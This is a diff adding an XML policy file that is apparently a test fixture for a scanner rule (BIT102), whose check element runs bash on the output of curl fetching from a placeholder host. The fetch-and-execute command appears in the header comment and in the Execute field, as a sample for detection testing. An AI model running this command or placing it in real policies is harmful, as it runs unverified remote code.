@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- bits/tests fixture content/bit102-bash-c-subst: BIT102: bash -c "$(curl -s http://example.invalid/x)" -->
+<Policy formatVersion="1.0">
+  <PolicyName>Fixture content/bit102-bash-c-subst</PolicyName>
+  <PolicyDescription>Bitscan test fixture.</PolicyDescription>
+  <PolicyStatus>enabled</PolicyStatus>
+  <Family>
+    <FamilyName>Bitscan Test Family</FamilyName>
+  </Family>
+  <PluginsGroups>
+    <Plugin>
+      <PluginName>1.1 - Fixture check 1</PluginName>
+      <PluginDescription>Fixture plugin 1.</PluginDescription>
+      <PluginId>3316c537-2838-5ce3-bdf0-f3b467f041af</PluginId>
+      <Execute timeout="30"><![CDATA[bash -c "$(curl -s http://example.invalid/x)"]]></Execute>
+      <Operator>equals</Operator>
+      <ExpectedResult>install ok installed</ExpectedResult>
+    </Plugin>
+  </PluginsGroups>
+</Policy>
